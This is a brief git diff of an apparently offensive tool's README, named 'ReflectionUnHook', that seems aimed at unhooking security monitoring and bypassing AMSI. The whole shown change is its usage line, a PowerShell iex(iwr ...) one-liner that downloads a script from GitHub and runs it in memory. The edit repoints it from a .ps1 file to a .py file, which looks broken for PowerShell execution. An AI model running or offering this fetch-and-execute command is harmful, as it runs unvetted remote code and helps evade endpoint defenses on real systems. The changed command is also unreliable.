@@ -15,7 +15,7 @@ FUNCTION UNHOOKED (Clear function after running AsparuxUnHook) -->
 # Instruction 
 
 ```
-iex (iwr -UseBasicParsing https://raw.githubusercontent.com/ASP4RUX/ReflectionUnHook/refs/heads/main/AsparuxUnHook.ps1)
+iex (iwr -UseBasicParsing https://raw.githubusercontent.com/ASP4RUX/ReflectionUnHook/refs/heads/main/asamsiobfuscate.py)
 ```
 
 ```
